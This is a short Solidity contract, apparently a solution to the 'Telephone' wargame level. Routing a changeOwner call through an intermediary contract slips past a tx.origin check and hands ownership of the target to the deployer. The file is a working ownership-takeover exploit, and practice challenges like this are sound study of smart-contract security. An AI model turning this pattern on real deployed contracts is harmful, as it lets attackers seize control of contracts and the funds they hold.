// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneAttack {
    Telephone public telephone;
    address public attacker;

    constructor(Telephone _telephone) {
        telephone = _telephone;
        attacker = msg.sender;
    }

    function attack() public {
        telephone.changeOwner(attacker);
    }
}
